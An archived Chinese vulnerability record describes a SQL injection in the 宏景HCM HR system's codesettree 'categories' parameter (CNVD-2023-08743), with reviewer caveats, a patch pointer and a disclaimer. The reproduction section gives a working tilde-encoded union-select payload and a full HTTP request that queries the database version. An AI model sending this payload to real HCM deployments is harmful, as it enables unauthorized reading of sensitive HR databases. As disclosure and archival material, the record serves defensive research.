---
source: "MrWQ/vulnerability-paper"
title: "宏景HCM codesettree categories SQL 注入"
product: "宏景HCM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CNVD-2023-08743"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "示例带session，鉴权未明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
identifier_role: "primary"
source_url: "https://mp.weixin.qq.com/s/PHUmaH3TdbgYDENJmYjXYw"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E5%AE%8F%E6%99%AF/%EF%BC%88CNVD-2023-08743%EF%BC%89%E5%AE%8F%E6%99%AF%20HCM%20SQL%20%E6%B3%A8%E5%85%A5.md"
id: "vw-97f82eac814940db8d24e2a1"
entity_id: "ve-97f82eac814940db8d24e2a1"
schema_version: "1"
---

# 宏景HCM codesettree categories SQL 注入

## 条目说明

- 对象与具体问题：宏景HCM；codesettree categories SQLi
- 版本、配置及部署条件：无版本
- 认证与权限前提：示例带session，鉴权未明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- tilde编码未解释，完整版本查询比敏感账号读取更适合证据
- 无修复build/原始代码/响应文本

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/PHUmaH3TdbgYDENJmYjXYw)

**漏洞说明**

宏景人力资源管理系统是一款由宏景软件研发的系统，主要功能包括人员、组织机构、档案、合同、薪资、保险、绩效、考勤、招聘、培训、干部任免和人事流程等业务的管理，以及人事、绩效、培训、招聘、考勤等业务自助，还具备了报表功能和灵活的表格工具，支持集团管控、目标管理、领导决策等应用。

宏景人力资源管理系统 categories 处存在 SQL 注入漏洞，攻击者可以从其中获取数据库敏感信息

**影响版本**

```
宏景人力资源管理系统

```

**漏洞复现**  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbUEOYibcaRpvON41MibqI1jCGoqoctyEFo2Lv0vFgb9bY5W5iaIyNFoMVrwPM2ziaibbDA5PYZe1EXesjw/640?wx_fmt=png)

payload:

```
/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27hellohongjingHcm~27~2c~40~40version~2d~2d
# 查询数据库版本

```

```http
GET /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27hellohongjingHcm~27~2c~40~40version~2d~2d HTTP/1.1
Host: IP
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Cookie: JSESSIONID=5******************************3
Accept-Encoding: gzip, deflate
Connection: close

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbUEOYibcaRpvON41MibqI1jCGOV3Ul4ylLI5yk2MMJNukV2CZictvxWhibGic36Bmdow2MMU8Lib74k3bWA/640?wx_fmt=png)

**修复建议**

**安装厂商发布的补丁：****http://hjsoft.com.cn/**

本文章仅用于学习交流，不得用于非法用途

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
